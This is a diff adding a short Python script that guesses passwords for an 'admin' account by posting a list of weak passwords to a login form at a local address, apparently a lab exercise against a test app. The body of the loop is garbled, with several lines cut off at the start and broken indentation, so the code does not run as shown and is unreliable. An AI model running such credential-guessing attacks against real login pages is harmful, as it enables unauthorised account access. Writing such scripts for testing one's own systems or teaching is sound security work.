@@ -1,0 +1,33 @@
+#!/usr/bin/env python3
+
+import requests
+
+URL = 'http://127.0.1.1:5000/user/login'
+
+username = 'admin'
+
+passwords = [
+    '1',
+    '12',
+    '123',
+    '1234',
+    '12345',
+    '123456',
+    '1234567',
+    '12345678',
+    'SuperSecret',
+]
+
+for password in passwords:
+    rt requests
+    rt urllib.parse
+    ed_url = urllib.parse.urlparse(URL)
+    arsed_url.scheme == 'http':
+    URL = parsed_url._replace(scheme='https').geturl()
+    onse = requests.post(URL, data = {'username': username, 'password': password}, timeout=30)
+    HOME' in response.text:
+    if 'HOME' in response.text:
+        print('cracked!', username, password)
+        break
+
+
